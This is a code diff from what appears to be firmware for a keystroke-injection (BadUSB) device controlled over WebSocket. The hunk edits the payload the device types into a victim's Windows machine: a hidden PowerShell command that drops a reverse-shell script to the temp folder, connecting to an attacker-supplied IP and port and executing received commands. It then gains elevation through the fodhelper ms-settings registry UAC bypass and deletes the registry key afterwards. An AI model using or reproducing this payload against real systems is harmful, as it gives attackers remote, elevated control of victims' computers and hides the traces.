@@ -524,12 +524,13 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1000);
         Keyboard.print(
             String("powershell -w h -nop -ep bypass -c \"") +
-            "$rcmd='powershell -w h -nop -ep bypass -c \"\"\"$c=New-Object Net.Sockets.TCPClient(''''" + currentAttackerIP + "''''," + currentAttackerPort + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()\"\"\"';" +
-            "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
-            "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
-            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value $rcmd -Force;"
-            "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
-            "Start-Sleep -s 3;"
+            "$p=$env:TEMP+'\\ar.ps1';" +
+            "Set-Content -Path $p -Value '$c=New-Object Net.Sockets.TCPClient(''" + currentAttackerIP + "''," + currentAttackerPort + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()';" +
+            "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;" +
+            "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;" +
+            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value ('powershell -w h -nop -ep bypass -f '+$p) -Force;" +
+            "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';" +
+            "Start-Sleep -s 5;" +
             "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
         delay(300);
         Keyboard.press(KEY_RETURN);
